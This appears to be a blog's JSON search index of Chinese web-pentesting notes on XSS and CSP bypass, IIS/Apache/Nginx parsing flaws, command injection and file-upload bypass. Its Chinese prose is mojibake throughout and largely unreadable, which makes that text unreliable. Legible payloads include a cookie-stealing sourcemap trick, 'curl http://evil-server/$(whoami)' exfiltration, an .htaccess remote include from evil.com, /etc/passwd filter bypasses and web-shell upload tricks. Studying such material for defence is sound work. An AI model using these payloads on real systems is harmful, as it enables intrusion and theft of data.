src=&quot;/main.js&quot;&gt;&lt;/script&gt; å…¶ä»– location ç»•è¿‡ å¯ä¸Šä¼ SVGæ—¶ï¼Œé€šè¿‡æ¶æ„SVGç»•è¿‡åŒæºç«™ç‚¹ å­˜åœ¨CRLFæ¼æ´ä¸”å¯æ§ç‚¹åœ¨CSPä¸Šæ–¹æ—¶ï¼Œå¯ä»¥æ³¨å…¥HTTPå“åº”ä¸­å½±å“CSPè§£æ CND Bypassï¼Œå¦‚æœç½‘ç«™ä¿¡ä»»äº†æŸä¸ªCDN, é‚£ä¹ˆå¯åˆ©ç”¨ç›¸åº”CDNçš„é™æ€èµ„æºbypass Angular versions &lt;1.5.9 &gt;&#x3D;1.5.0ï¼Œå­˜åœ¨æ¼æ´ Git Pull Request jQuery sourcemap document.write( //@ sourceMappingURL=http://xxxx/`+document.cookie+`);`` aæ ‡ç­¾çš„pingå±æ€§ For FireFox &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&quot;&gt; &lt;link rel=&quot;import&quot; /&gt; &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://....&quot; /&gt; ä»…é™åˆ¶ script-src æ—¶ï¼š &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt; XSSæ•°æ®æºURL location location.href location.pathname location.search location.hash document.URL document.documentURI document.baseURI Navigation window.name document.referrer Communication Ajax Fetch WebSocket PostMessage Storage Cookie LocalStorage SessionStorage Sinkæ‰§è¡ŒJavaScript eval(payload) setTimeout(payload, 100) setInterval(payload, 100) Function(payload)() &lt;script&gt;payload&lt;/script&gt; &lt;img src=x onerror=payload&gt; åŠ è½½URL location=javascript:alert(/xss/) location.href=javascript:alert(/xss/) location.assign(javascript:alert(/xss/)) location.replace(javascript:alert(/xss/)) æ‰§è¡ŒHTML xx.innerHTML=payload xx.outerHTML=payload document.write(payload) document.writeln(payload) xssä¿æŠ¤HTMLè¿‡æ»¤ä½¿ç”¨ä¸€äº›ç™½åå•æˆ–è€…é»‘åå•æ¥è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„HTMLï¼Œä»¥å®ç°è¿‡æ»¤çš„æ•ˆæœã€‚ä¾‹å¦‚DOMPurifyç­‰å·¥å…·éƒ½æ˜¯ç”¨è¯¥æ–¹å¼å®ç°äº†XSSçš„ä¿æŠ¤ã€‚ X-FrameX-Frame-Options å“åº”å¤´æœ‰ä¸‰ä¸ªå¯é€‰çš„å€¼ï¼š DENY é¡µé¢ä¸èƒ½è¢«åµŒå…¥åˆ°ä»»ä½•iframeæˆ–frameä¸­ SAMEORIGIN é¡µé¢åªèƒ½è¢«æœ¬ç«™é¡µé¢åµŒå…¥åˆ°iframeæˆ–è€…frameä¸­ ALLOW-FROM é¡µé¢å…è®¸frameæˆ–frameåŠ è½½ XSSä¿æŠ¤å¤´åŸºäº Webkit å†…æ ¸çš„æµè§ˆå™¨(æ¯”å¦‚Chrome)åœ¨ç‰¹å®šç‰ˆæœ¬èŒƒå›´å†…æœ‰ä¸€ä¸ªåä¸ºXSS auditorçš„é˜²æŠ¤æœºåˆ¶ï¼Œå¦‚æœæµè§ˆå™¨æ£€æµ‹åˆ°äº†å«æœ‰æ¶æ„ä»£ç çš„è¾“å…¥è¢«å‘ˆç°åœ¨HTMLæ–‡æ¡£ä¸­ï¼Œé‚£ä¹ˆè¿™æ®µå‘ˆç°çš„æ¶æ„ä»£ç è¦ä¹ˆè¢«åˆ é™¤ï¼Œè¦ä¹ˆè¢«è½¬ä¹‰ï¼Œæ¶æ„ä»£ç ä¸ä¼šè¢«æ­£å¸¸çš„æ¸²æŸ“å‡ºæ¥ã€‚ è€Œæµè§ˆå™¨æ˜¯å¦è¦æ‹¦æˆªè¿™æ®µæ¶æ„ä»£ç å–å†³äºæµè§ˆå™¨çš„XSSé˜²æŠ¤è®¾ç½®ã€‚ è¦è®¾ç½®æµè§ˆå™¨çš„é˜²æŠ¤æœºåˆ¶ï¼Œåˆ™å¯ä½¿ç”¨X-XSS-Protectionå­—æ®µ è¯¥å­—æ®µæœ‰ä¸‰ä¸ªå¯é€‰çš„å€¼ 0 : è¡¨ç¤ºå…³é—­æµè§ˆå™¨çš„XSSé˜²æŠ¤æœºåˆ¶ 1 : åˆ é™¤æ£€æµ‹åˆ°çš„æ¶æ„ä»£ç ï¼Œ å¦‚æœå“åº”æŠ¥æ–‡ä¸­æ²¡æœ‰çœ‹åˆ° X-XSS-Protection å­—æ®µï¼Œé‚£ä¹ˆæµè§ˆå™¨å°±è®¤ä¸ºX-XSS-Protectioné…ç½®ä¸º1ï¼Œè¿™æ˜¯æµè§ˆå™¨çš„é»˜è®¤è®¾ç½® 1; mode=block : å¦‚æœæ£€æµ‹åˆ°æ¶æ„ä»£ç ï¼Œåœ¨ä¸æ¸²æŸ“æ¶æ„ä»£ç  FireFoxæ²¡æœ‰ç›¸å…³çš„ä¿æŠ¤æœºåˆ¶ï¼Œå¦‚æœéœ€è¦ä¿æŠ¤ï¼Œå¯ä½¿ç”¨NoScriptç­‰ç›¸å…³æ’ä»¶ã€‚","categories":[],"tags":[]},{"title":"ä¸­é—´ä»¶","slug":"ä¸­é—´ä»¶","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:47:09.639Z","comments":true,"path":"2023/12/26/ä¸­é—´ä»¶/","link":"","permalink":"http://example.com/2023/12/26/%E4%B8%AD%E9%97%B4%E4%BB%B6/","excerpt":"[TOC]","text":"[TOC] IISIIS 6.0 åç¼€è§£æ /xx.asp;.jpg æœåŠ¡å™¨é»˜è®¤ä¸è§£æ ; å·åŠå…¶åé¢çš„å†…å®¹ï¼Œç›¸å½“äºæˆªæ–­ã€‚ ç›®å½•è§£æ /xx.asp/xx.jpg (xx.aspç›®å½•ä¸‹ä»»æ„è§£æ) é»˜è®¤è§£æ xx.asa xx.cer xx.cdx PROPFIND æ ˆæº¢å‡ºæ¼æ´ RCE CVE-2017-7269 IIS 7.0-7.5 &#x2F; Nginx &lt;&#x3D; 0.8.37åœ¨Fast-CGIå¼€å¯çŠ¶æ€ä¸‹ï¼Œåœ¨æ–‡ä»¶è·¯å¾„ååŠ ä¸Š /xx.php ï¼Œå³ xx.jpg/xx.php ä¼šè¢«è§£æä¸ºphpæ–‡ä»¶ã€‚ PUTæ¼æ´ å¼€å¯WebDAV æ‹¥æœ‰æ¥å®¾ç”¨æˆ·ï¼Œä¸”æ¥å®¾ç”¨æˆ·æ‹¥æœ‰ä¸Šä¼ æƒé™ å¯ä»»æ„æ–‡ä»¶ä¸Šä¼  Windowsç‰¹æ€§Windowsä¸å…è®¸ç©ºæ ¼å’Œç‚¹ä»¥åŠä¸€äº›ç‰¹æ®Šå­—ç¬¦ä½œä¸ºç»“å°¾ï¼Œåˆ›å»ºè¿™æ ·çš„æ–‡ä»¶ä¼šè‡ªåŠ¨é‡å‘½åï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ xx.php[ç©ºæ ¼] ï¼Œ xx.php.ï¼Œ xx.php/ï¼Œ xx.php::$DATA ä¸Šä¼ è„šæœ¬æ–‡ä»¶ã€‚ æ–‡ä»¶åçŒœè§£åœ¨æ”¯æŒNTFS 8.3æ–‡ä»¶æ ¼å¼æ—¶ï¼Œå¯åˆ©ç”¨çŸ­æ–‡ä»¶åçŒœè§£ç›®å½•æ–‡ä»¶ã€‚å…¶ä¸­çŸ­æ–‡ä»¶åç‰¹å¾å¦‚ä¸‹ï¼š æ–‡ä»¶åä¸ºåŸæ–‡ä»¶åå‰6ä½å­—ç¬¦åŠ ä¸Š ~1 ï¼Œå…¶ä¸­æ•°å­—éƒ¨åˆ†æ˜¯é€’å¢çš„ï¼Œå¦‚æœå­˜åœ¨å‰ç¼€ç›¸åŒçš„æ–‡ä»¶ï¼Œåˆ™åé¢çš„æ•°å­—è¿›è¡Œé€’å¢ã€‚ åç¼€åä¸è¶…è¿‡3ä½ï¼Œè¶…è¿‡éƒ¨åˆ†ä¼šè¢«æˆªæ–­ æ‰€æœ‰å°å†™å­—æ¯å‡è½¬æ¢æˆå¤§å†™çš„å­—æ¯ æ–‡ä»¶ååç¼€é•¿åº¦å¤§äºç­‰äº4æˆ–è€…æ€»é•¿åº¦å¤§äºç­‰äº9æ—¶æ‰ä¼šç”ŸæˆçŸ­æ–‡ä»¶åï¼Œå¦‚æœåŒ…å«ç©ºæ ¼æˆ–è€…å…¶ä»–éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™æ— è§†é•¿åº¦æ¡ä»¶ IIS 8.0ä¹‹å‰çš„ç‰ˆæœ¬æ”¯æŒçŸ­æ–‡ä»¶åçŒœæµ‹çš„HTTPæ–¹æ³•ä¸»è¦åŒ…æ‹¬ï¼šDEBUGã€OPTIONSã€GETã€POSTã€HEADã€TRACEå…­ç§ï¼Œéœ€è¦å®‰è£…ASP.NETã€‚è€ŒIIS 8.0ä¹‹åçš„ç‰ˆæœ¬åªèƒ½é€šè¿‡OPTIONSå’ŒTRACEæ–¹æ³•çŒœæµ‹æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰ASP.NETçš„é™åˆ¶ã€‚ è¿™ç§æ–¹æ³•çš„å±€é™æ€§åœ¨äºï¼š æ–‡ä»¶å¤¹åå‰6ä½å­—ç¬¦å¸¦ç‚¹â€.â€ï¼Œæ‰«æç¨‹åºä¼šè®¤ä¸ºæ˜¯æ–‡ä»¶è€Œä¸æ˜¯æ–‡ä»¶å¤¹ï¼Œæœ€ç»ˆå‡ºç°è¯¯æŠ¥ ä¸æ”¯æŒä¸­æ–‡æ–‡ä»¶å è¿™ç§æ–¹æ³•å¯ä»¥é€šè¿‡å‘½ä»¤ fsutil behavior set disable8dot3 1 å…³é—­NTFS 8.3æ–‡ä»¶æ ¼å¼çš„æ”¯æŒæ¥ä¿®å¤ã€‚ Apacheåç¼€è§£ætest.php.x1.x2.x3 ï¼ˆ x1,x2,x3 ä¸ºæ²¡æœ‰åœ¨ mime.types æ–‡ä»¶ä¸­å®šä¹‰çš„æ–‡ä»¶ç±»å‹ï¼‰ã€‚Apache å°†ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­åç¼€ï¼Œ è‹¥x3ä¸ºéå¯è¯†åˆ«åç¼€ï¼Œåˆ™åˆ¤æ–­x2ï¼Œç›´åˆ°æ‰¾åˆ°å¯è¯†åˆ«åç¼€ä¸ºæ­¢ï¼Œç„¶åå¯¹å¯è¯†åˆ«åç¼€è¿›è¡Œè§£æ htaccesså½“AllowOverrideè¢«å¯ç”¨æ—¶ï¼Œä¸Šä¼ å¯ç”¨è§£æè§„åˆ™çš„.htaccess 123456789101112AddType application/x-httpd-php .jpgphp_value auto_append_file .htaccess#&lt;?php phpinfo();Options ExecCGIAddHandler cgi-script .jpgOptions +ExecCGIAddHandler fcgid-script .gifFcgidWrapper &quot;/bin/bash&quot; .gifphp_flag allow_url_include 1php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B#php_value auto_append_file https://evil.com/evil-code.txt ç›®å½•éå†é…ç½® Options +Indexes æ—¶Apacheå­˜åœ¨ç›®å½•éå†æ¼æ´ã€‚ CVE-2017-15715%0A ç»•è¿‡ä¸Šä¼ é»‘åå•ã€‚ 4.15.2.5. lighttpd1xx.jpg/xx.php NginxFast-CGIå…³é—­åœ¨Fast-CGIå…³é—­çš„æƒ…å†µä¸‹ï¼Œ Nginx ä»ç„¶å­˜åœ¨è§£ææ¼æ´ï¼š åœ¨æ–‡ä»¶è·¯å¾„(xx.jpg)åé¢åŠ ä¸Š %00.php ï¼Œ å³ xx.jpg%00.php ä¼šè¢«å½“åš php æ–‡ä»¶æ¥è§£æ Fast-CGIå¼€å¯åœ¨Fast-CGIå¼€å¯çŠ¶æ€ä¸‹ï¼Œåœ¨æ–‡ä»¶è·¯å¾„ååŠ ä¸Š /xx.php ï¼Œåˆ™ xx.jpg/xx.php ä¼šè¢«è§£æä¸ºphpæ–‡ä»¶ CVE-2013-45471a.jpg\\x20\\x00.php é…ç½®é”™è¯¯ç›®å½•ç©¿è¶Šå¦‚æœé…ç½®ä¸­å­˜åœ¨ç±»ä¼¼ location /foo &#123; alias /bar/; &#125; çš„é…ç½®æ—¶ï¼Œ/foo../ ä¼šè¢«è§£æä¸º /bar/../ ä»è€Œå¯¼è‡´ç›®å½•ç©¿è¶Šçš„å‘ç”Ÿã€‚ ç›®å½•éå†é…ç½®ä¸­ autoindex on å¼€å¯æ—¶ï¼ŒNginxä¸­å­˜åœ¨ç›®å½•éå†æ¼æ´ã€‚","categories":[],"tags":[]},{"title":"ä¸»åŠ¨æ‰“ç‚¹å’Œè¢«åŠ¨æ‰“ç‚¹","slug":"ä¸»åŠ¨æ‰“ç‚¹å’Œè¢«åŠ¨æ‰“ç‚¹","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:47:17.223Z","comments":true,"path":"2023/12/26/ä¸»åŠ¨æ‰“ç‚¹å’Œè¢«åŠ¨æ‰“ç‚¹/","link":"","permalink":"http://example.com/2023/12/26/%E4%B8%BB%E5%8A%A8%E6%89%93%E7%82%B9%E5%92%8C%E8%A2%AB%E5%8A%A8%E6%89%93%E7%82%B9/","excerpt":"ä¸»åŠ¨æ‰“ç‚¹å’Œè¢«åŠ¨æ‰“ç‚¹12ä¸»åŠ¨å¼ä¿¡æ¯æ‰“ç‚¹ï¼šä¸»åŠ¨ä½¿ç”¨å·¥å…·ã€ä¸»åŠ¨å‘èµ·æµ‹è¯•æµé‡ç­‰è¢«åŠ¨å¼ä¿¡æ¯æ‰“ç‚¹ï¼šè°ƒç”¨æ¥å£è·å–ä¿¡æ¯ç­‰","text":"ä¸»åŠ¨æ‰“ç‚¹å’Œè¢«åŠ¨æ‰“ç‚¹12ä¸»åŠ¨å¼ä¿¡æ¯æ‰“ç‚¹ï¼šä¸»åŠ¨ä½¿ç”¨å·¥å…·ã€ä¸»åŠ¨å‘èµ·æµ‹è¯•æµé‡ç­‰è¢«åŠ¨å¼ä¿¡æ¯æ‰“ç‚¹ï¼šè°ƒç”¨æ¥å£è·å–ä¿¡æ¯ç­‰ #","categories":[],"tags":[]},{"title":"å‘½ä»¤æ³¨å…¥","slug":"å‘½ä»¤æ³¨å…¥","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:45:32.186Z","comments":true,"path":"2023/12/26/å‘½ä»¤æ³¨å…¥/","link":"","permalink":"http://example.com/2023/12/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/","excerpt":"å‘½ä»¤æ³¨å…¥ç®€ä»‹å‘½ä»¤æ³¨å…¥é€šå¸¸å› ä¸ºæŒ‡Webåº”ç”¨åœ¨æœåŠ¡å™¨ä¸Šæ‹¼æ¥ç³»ç»Ÿå‘½ä»¤è€Œé€ æˆçš„æ¼æ´ã€‚ è¯¥ç±»æ¼æ´é€šå¸¸å‡ºç°åœ¨è°ƒç”¨å¤–éƒ¨ç¨‹åºå®Œæˆä¸€äº›åŠŸèƒ½çš„æƒ…æ™¯ä¸‹ã€‚æ¯”å¦‚ä¸€äº›Webç®¡ç†ç•Œé¢çš„é…ç½®ä¸»æœºå&#x2F;IP&#x2F;æ©ç &#x2F;ç½‘å…³ã€æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ä»¥åŠå…³é—­é‡å¯ç­‰åŠŸèƒ½ï¼Œæˆ–è€…ä¸€äº›ç«™ç‚¹æä¾›å¦‚pingã€nslookupã€æä¾›å‘é€é‚®ä»¶ã€è½¬æ¢å›¾ç‰‡ç­‰åŠŸèƒ½éƒ½å¯èƒ½å‡ºç°è¯¥ç±»æ¼æ´ã€‚","text":"å‘½ä»¤æ³¨å…¥ç®€ä»‹å‘½ä»¤æ³¨å…¥é€šå¸¸å› ä¸ºæŒ‡Webåº”ç”¨åœ¨æœåŠ¡å™¨ä¸Šæ‹¼æ¥ç³»ç»Ÿå‘½ä»¤è€Œé€ æˆçš„æ¼æ´ã€‚ è¯¥ç±»æ¼æ´é€šå¸¸å‡ºç°åœ¨è°ƒç”¨å¤–éƒ¨ç¨‹åºå®Œæˆä¸€äº›åŠŸèƒ½çš„æƒ…æ™¯ä¸‹ã€‚æ¯”å¦‚ä¸€äº›Webç®¡ç†ç•Œé¢çš„é…ç½®ä¸»æœºå&#x2F;IP&#x2F;æ©ç &#x2F;ç½‘å…³ã€æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ä»¥åŠå…³é—­é‡å¯ç­‰åŠŸèƒ½ï¼Œæˆ–è€…ä¸€äº›ç«™ç‚¹æä¾›å¦‚pingã€nslookupã€æä¾›å‘é€é‚®ä»¶ã€è½¬æ¢å›¾ç‰‡ç­‰åŠŸèƒ½éƒ½å¯èƒ½å‡ºç°è¯¥ç±»æ¼æ´ã€‚ . å¸¸è§å±é™©å‡½æ•°PHP system exec passthru shell_exec popen proc_open Python system popen subprocess.call spawn Java java.lang.Runtime.getRuntime().exec(command) å¸¸è§æ³¨å…¥æ–¹å¼ åˆ†å·åˆ†å‰² || &amp;&amp; &amp; åˆ†å‰² | ç®¡é“ç¬¦ \\r\\n %d0%a0 æ¢è¡Œ åå¼•å·è§£æ $() æ›¿æ¢ æ— å›æ˜¾æŠ€å·§ bashåå¼¹shell DNSå¸¦å¤–æ•°æ® httpå¸¦å¤– curl http://evil-server/$(whoami)``wget http://evil-server/$(whoami) æ— å¸¦å¤–æ—¶åˆ©ç”¨ sleep æˆ–å…¶ä»–é€»è¾‘æ„é€ å¸ƒå°”æ¡ä»¶ å¸¸è§ç»•è¿‡æ–¹å¼ç©ºæ ¼ç»•è¿‡ &lt; ç¬¦å· cat&lt;123 \\t &#x2F; %09 $&#123;IFS&#125; å…¶ä¸­{}ç”¨æ¥æˆªæ–­ï¼Œæ¯”å¦‚cat$IFS2ä¼šè¢«è®¤ä¸ºIFS2æ˜¯å˜é‡åã€‚å¦å¤–ï¼Œåœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ï¼Œä¸€èˆ¬ç”¨$9ï¼Œå› ä¸º$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸² . é»‘åå•ç»•è¿‡ a=l;b=s;$a$b base64 echo &quot;bHM=&quot; | base64 -d /?in/?s &#x3D;&gt; /bin/ls è¿æ¥ç¬¦ cat /etc/pass&#39;w&#39;d æœªå®šä¹‰çš„åˆå§‹åŒ–å˜é‡ cat$x /etc/passwd é•¿åº¦é™åˆ¶ç»•è¿‡12345&gt;wget\\&gt;foo.\\&gt;comls -t&gt;ash a ä¸Šé¢çš„æ–¹æ³•ä¸ºé€šè¿‡å‘½ä»¤è¡Œé‡å®šå‘å†™å…¥å‘½ä»¤ï¼Œæ¥ç€é€šè¿‡lsæŒ‰æ—¶é—´æ’åºæŠŠå‘½ä»¤å†™å…¥æ–‡ä»¶ï¼Œæœ€åæ‰§è¡Œ ç›´æ¥åœ¨Linuxç»ˆç«¯ä¸‹æ‰§è¡Œçš„è¯,åˆ›å»ºæ–‡ä»¶éœ€è¦åœ¨é‡å®šå‘ç¬¦å·ä¹‹å‰æ·»åŠ å‘½ä»¤ è¿™é‡Œå¯ä»¥ä½¿ç”¨ä¸€äº›è¯¸å¦‚w,[ä¹‹ç±»çš„çŸ­å‘½ä»¤ï¼Œ(ä½¿ç”¨ls &#x2F;usr&#x2F;bin&#x2F;?æŸ¥çœ‹) å¦‚æœä¸æ·»åŠ å‘½ä»¤ï¼Œéœ€è¦Ctrl+Dæ‰èƒ½ç»“æŸï¼Œè¿™æ ·å°±ç­‰äºæ ‡å‡†è¾“å…¥æµçš„é‡å®šå‘ è€Œåœ¨phpä¸­ , ä½¿ç”¨ shell_exec ç­‰æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°çš„æ—¶å€™ , æ˜¯ä¸å­˜åœ¨æ ‡å‡†è¾“å…¥æµçš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åˆ›å»ºæ–‡ä»¶ å¸¸ç”¨ç¬¦å·å‘½ä»¤åˆ†éš”ç¬¦ %0a &#x2F; %0d &#x2F; \\n &#x2F; \\r ; &amp; &#x2F; &amp;&amp; é€šé…ç¬¦ * 0åˆ°æ— ç©·ä¸ªä»»æ„å­—ç¬¦ ? ä¸€ä¸ªä»»æ„å­—ç¬¦ [ ] ä¸€ä¸ªåœ¨æ‹¬å·å†…çš„å­—ç¬¦ï¼Œe.g. [abcd] [ - ] åœ¨ç¼–ç é¡ºåºå†…çš„æ‰€æœ‰å­—ç¬¦ [^ ] ä¸€ä¸ªä¸åœ¨æ‹¬å·å†…çš„å­—ç¬¦ é˜²å¾¡ ä¸ä½¿ç”¨æ—¶ç¦ç”¨ç›¸åº”å‡½æ•° å°½é‡ä¸è¦æ‰§è¡Œå¤–éƒ¨çš„åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ åšè¾“å…¥çš„æ ¼å¼æ£€æŸ¥ è½¬ä¹‰å‘½ä»¤ä¸­çš„æ‰€æœ‰shellå…ƒå­—ç¬¦ shellå…ƒå­—ç¬¦åŒ…æ‹¬ #&amp;;,|*?~&lt;&gt;^()[]{}$`","categories":[],"tags":[]},{"title":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:46:49.302Z","comments":true,"path":"2023/12/26/æ–‡ä»¶ä¸Šä¼ /","link":"","permalink":"http://example.com/2023/12/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶ç±»å‹æ£€æµ‹ç»•è¿‡æ›´æ”¹è¯·æ±‚ç»•è¿‡æœ‰çš„ç«™ç‚¹ä»…ä»…åœ¨å‰ç«¯æ£€æµ‹äº†æ–‡ä»¶ç±»å‹ï¼Œè¿™ç§ç±»å‹çš„æ£€æµ‹å¯ä»¥ç›´æ¥ä¿®æ”¹ç½‘ç»œè¯·æ±‚ç»•è¿‡ã€‚ åŒæ ·çš„ï¼Œæœ‰çš„ç«™ç‚¹åœ¨åç«¯ä»…æ£€æŸ¥äº†HTTP Headerä¸­çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ Content-Type ç­‰ï¼Œè¿™ç§æ£€æŸ¥åŒæ ·å¯ä»¥é€šè¿‡ä¿®æ”¹ç½‘ç»œè¯·æ±‚ç»•è¿‡ã€‚","text":"æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶ç±»å‹æ£€æµ‹ç»•è¿‡æ›´æ”¹è¯·æ±‚ç»•è¿‡æœ‰çš„ç«™ç‚¹ä»…ä»…åœ¨å‰ç«¯æ£€æµ‹äº†æ–‡ä»¶ç±»å‹ï¼Œè¿™ç§ç±»å‹çš„æ£€æµ‹å¯ä»¥ç›´æ¥ä¿®æ”¹ç½‘ç»œè¯·æ±‚ç»•è¿‡ã€‚ åŒæ ·çš„ï¼Œæœ‰çš„ç«™ç‚¹åœ¨åç«¯ä»…æ£€æŸ¥äº†HTTP Headerä¸­çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ Content-Type ç­‰ï¼Œè¿™ç§æ£€æŸ¥åŒæ ·å¯ä»¥é€šè¿‡ä¿®æ”¹ç½‘ç»œè¯·æ±‚ç»•è¿‡ã€‚ Magicæ£€æµ‹ç»•è¿‡æœ‰çš„ç«™ç‚¹ä½¿ç”¨æ–‡ä»¶å¤´æ¥æ£€æµ‹æ–‡ä»¶ç±»å‹ï¼Œè¿™ç§æ£€æŸ¥å¯ä»¥åœ¨Shellå‰åŠ å…¥å¯¹åº”çš„å­—èŠ‚ä»¥ç»•è¿‡æ£€æŸ¥ã€‚å‡ ç§å¸¸è§çš„æ–‡ä»¶ç±»å‹çš„å¤´å­—èŠ‚å¦‚ä¸‹è¡¨æ‰€ç¤º ç±»å‹ äºŒè¿›åˆ¶å€¼ JPG FF D8 FF E0 00 10 4A 46 49 46 GIF 47 49 46 38 39 61 PNG 89 50 4E 47 TIF 49 49 2A 00 BMP 42 4D åç¼€ç»•è¿‡éƒ¨åˆ†æœåŠ¡ä»…æ ¹æ®åç¼€ã€ä¸Šä¼ æ—¶çš„ä¿¡æ¯æˆ–Magic Headeræ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œæ­¤æ—¶å¯ä»¥ç»•è¿‡ã€‚ phpç”±äºå†å²åŸå› ï¼Œéƒ¨åˆ†è§£é‡Šå™¨å¯èƒ½æ”¯æŒç¬¦åˆæ­£åˆ™ /ph(p[2-7]?|t(ml)?)/ çš„åç¼€ï¼Œå¦‚ php &#x2F; php5 &#x2F; pht &#x2F; phtml &#x2F; shtml &#x2F; pwml &#x2F; phtm ç­‰ å¯åœ¨ç¦æ­¢ä¸Šä¼ phpæ–‡ä»¶æ—¶æµ‹è¯•è¯¥ç±»å‹ã€‚ jspå¼•æ“åˆ™å¯èƒ½ä¼šè§£æ jspx &#x2F; jspf &#x2F; jspa &#x2F; jsw &#x2F; jsv &#x2F; jtml ç­‰åç¼€ï¼Œaspæ”¯æŒ asa &#x2F; asax &#x2F; cer &#x2F; cdx &#x2F; aspx &#x2F; ascx &#x2F; ashx &#x2F; asmx &#x2F; asp&#123;80-90&#125; ç­‰åç¼€ã€‚ é™¤äº†è¿™äº›ç»•è¿‡ï¼Œå…¶ä»–çš„åç¼€åŒæ ·å¯èƒ½å¸¦æ¥é—®é¢˜ï¼Œå¦‚ vbs &#x2F; asis &#x2F; sh &#x2F; reg &#x2F; cgi &#x2F; exe &#x2F; dll &#x2F; com &#x2F; bat &#x2F; pl &#x2F; cfc &#x2F; cfm &#x2F; ini ç­‰ã€‚ ç³»ç»Ÿå‘½åç»•è¿‡åœ¨Windowsç³»ç»Ÿä¸­ï¼Œä¸Šä¼  index.php. ä¼šé‡å‘½åä¸º . ï¼Œå¯ä»¥ç»•è¿‡åç¼€æ£€æŸ¥ã€‚ ä¹Ÿå¯å°è¯• index.php%20 ï¼Œ index.php:1.jpg index.php::$DATA ç­‰ã€‚ åœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¯ä»¥å°è¯•ä¸Šä¼ åä¸º index.php/. æˆ– ./aa/../index.php/. çš„æ–‡ä»¶ .user.iniåœ¨phpæ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œé™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[â€˜DOCUMENT_ROOTâ€™] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚ .user.ini ä¸­å¯ä»¥å®šä¹‰é™¤äº†PHP_INI_SYSTEMä»¥å¤–çš„æ¨¡å¼çš„é€‰é¡¹ï¼Œæ•…å¯ä»¥ä½¿ç”¨ .user.ini åŠ ä¸Šéphpåç¼€çš„æ–‡ä»¶æ„é€ ä¸€ä¸ªshellï¼Œæ¯”å¦‚ auto_prepend_file=01.gif ã€‚ WAFç»•è¿‡æœ‰çš„wafåœ¨ç¼–å†™è¿‡ç¨‹ä¸­è€ƒè™‘åˆ°æ€§èƒ½åŸå› ï¼Œåªå¤„ç†ä¸€éƒ¨åˆ†æ•°æ®ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡åŠ å…¥å¤§é‡åƒåœ¾æ•°æ®æ¥ç»•è¿‡å…¶å¤„ç†å‡½æ•°ã€‚ å¦å¤–ï¼ŒWafå’ŒWebç³»ç»Ÿå¯¹ boundary çš„å¤„ç†ä¸ä¸€è‡´ï¼Œå¯ä»¥ä½¿ç”¨é”™è¯¯çš„ boundary æ¥å®Œæˆç»•è¿‡ã€‚ ç«äº‰ä¸Šä¼ ç»•è¿‡æœ‰çš„æœåŠ¡å™¨é‡‡ç”¨äº†å…ˆä¿å­˜ï¼Œå†åˆ é™¤ä¸åˆæ³•æ–‡ä»¶çš„æ–¹å¼ï¼Œåœ¨è¿™ç§æœåŠ¡å™¨ä¸­ï¼Œå¯ä»¥åå¤ä¸Šä¼ ä¸€ä¸ªä¼šç”ŸæˆWeb Shellçš„æ–‡ä»¶å¹¶å°è¯•è®¿é—®ï¼Œå¤šæ¬¡ä¹‹åå³å¯è·å¾—Shellã€‚ æ”»å‡»æŠ€å·§Apacheé‡å†™GetShellApacheå¯æ ¹æ®æ˜¯å¦å…è®¸é‡å®šå‘è€ƒè™‘ä¸Šä¼ .htaccess å†…å®¹ä¸º 12AddType application/x-httpd-php .pngphp_flag engine 1 å°±å¯ä»¥ç”¨pngæˆ–è€…å…¶ä»–åç¼€çš„æ–‡ä»¶åšphpè„šæœ¬äº† è½¯é“¾æ¥ä»»æ„è¯»æ–‡ä»¶ä¸Šä¼ 